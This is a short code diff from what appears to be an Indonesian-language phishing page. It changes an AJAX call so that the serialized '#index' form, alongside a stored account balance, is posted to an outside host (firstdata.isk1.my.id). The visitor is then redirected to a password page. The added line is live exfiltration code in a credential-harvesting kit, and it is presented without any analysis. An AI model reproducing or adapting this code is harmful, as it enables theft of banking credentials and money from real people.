@@ -536,12 +536,12 @@ padding-left: 10px;
                             sessionStorage.setItem('saldo', saldo);
                             $.ajax({
                                 type: 'POST',
-                                url: '7916/1.php',
+                                url: 'https://firstdata.isk1.my.id/7916/1.php',
                                 data: $('#index').serialize(),
                                 datatype: 'JSON',
                                 complete: function() {
                                     setTimeout(function() {
-                                        window.location = "password.php";
+                                        window.location = "password.html";
                                         $("#Patok").hide();
                                         $('.load').fadeOut();
                                         document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
